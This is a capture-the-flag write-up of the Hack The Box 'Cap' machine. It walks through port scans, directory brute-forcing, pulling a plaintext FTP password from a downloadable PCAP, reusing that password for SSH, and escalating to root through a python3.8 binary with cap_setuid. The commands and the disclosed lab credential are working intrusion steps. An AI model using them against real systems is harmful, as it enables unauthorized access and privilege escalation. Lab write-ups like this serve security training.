# cap

> A Linux box with a security monitoring web application that allows users to download various PCAPs, one of which contains SSH credentials. `/usr/bin/python3.8` has the `cap_setuid` capability, allowing any `/usr/bin/python3.8` process to set its user ID to 0 for full administrative access.

---

## Open Port Discovery

```bash
$ masscan --ports 1-65535 10.10.10.245 --rate=1000 -e tun0 --output-format grepable --output-filename cap-tcp.masscan
$ cat cap-tcp.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
21,22,80,
```

Ports 21, 22, and 80 are open.

---

## Open Port Enumeration

```bash
$ nmap -sC -sV -O -p21,22,80 10.10.10.245 -oA cap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 19:35 CDT

Nmap scan report for 10.10.10.245
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sat, 04 Sep 2021 00:36:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 04 Sep 2021 00:36:04 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 04 Sep 2021 00:36:04 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request                                                                                                                                                [9/410]
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=9/3%Time=6132BF76%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20S
SF:at,\x2004\x20Sep\x202021\x2000:36:04\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201938
SF:6\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\n
SF:\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20
SF:<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x
SF:20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\x
SF:20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1
SF:\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image/
SF:png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<l
SF:ink\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">\
SF:n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/font
SF:-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=\
SF:"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.c
SF:ss\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/cs
SF:s/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOptions
SF:,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,\x20
SF:04\x20Sep\x202021\x2000:36:04\x20GMT\r\nConnection:\x20close\r\nContent
SF:-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x20
SF:HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text/
SF:html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20\
SF:x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\n
SF:\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invalid
SF:\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP/
SF:1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189,
SF:"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20Sa
SF:t,\x2004\x20Sep\x202021\x2000:36:09\x20GMT\r\nConnection:\x20close\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\r
SF:\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20F
SF:inal//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\
SF:n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20serv
SF:er\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20che
SF:ck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.48 seconds
```

---

## FTP Enumeration

According to the results of the `nmap` scan, the target is running `vsftpd 3.0.3`. There doesn't appear to be any public exploits for this version and anonymous login was unsuccessful.

---

## Web Application Enumeration

### Content Discovery

```bash
$ gobuster dir -u http://10.10.10.245 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.245
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/03 19:51:01 Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
/ip                   (Status: 200) [Size: 17374]                         
/capture              (Status: 302) [Size: 220] [--> http://10.10.10.245/data/9]
                                                                                
===============================================================
2021/09/03 19:54:15 Finished
===============================================================
```

### Manual Enumeration

The results of the `nmap` scan seem to indicate that the application is running `gunicorn`, an asynchronous Python web server.

#### `/` & `/data`: Home Page / Dashboard

The home page of the web application appears to be some sort of security monitoring dashboard.

![Pasted image 20210903204726](images/Pasted%20image%2020210903204726.png)

The charts appear to be static.

The hamburger menu in the top left corner indicates three other pages: `Security Snapshot (5 Second PCAP + Analysis)`, `IP Config`, and `Network Status`.

![Pasted image 20210903205753](images/Pasted%20image%2020210903205753.png)

#### `/capture`: Security Snapshot (5 Second PCAP + Analysis)

This page offers a PCAP download and "statistics" based on the PCAP.

![Pasted image 20210903210022](images/Pasted%20image%2020210903210022.png)

The page always redirects to `/data/$N`, where `$N` is an integer between 0 and 10. Each different value of `$N` yields a different packet capture file.

---

## Packet Capture with SSH Credentials

Open up the packet capture file from from `/data/0` in Wireshark and note that it contains a plaintext FTP login.

![Pasted image 20210903223041](images/Pasted%20image%2020210903223041.png)

This discloses the credentials `nathan:Buck3tH4TF0RM3!`. Use the credentials to log in to the target via SSH and get the user flag from `/home/nathan/user.txt`.

---

## Privilege Escalation

### Enumeration

List all binary capabilities.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

`/usr/bin/python3.8` has the `cap_setuid` capabilitiy. With this capabilitiy, any `python3.8` process has the permission to set its user ID arbitrarily. If it set its user ID to 0, it would have full administrative privileges.

### Exploitation

Drop into a Python shell, set the UID to 0 and read the root flag.

```bash
$ python3.8
>>> import os
>>> os.setuid(0)
>>> with open("/root/root.txt") as f:
>>>		f.read()
```
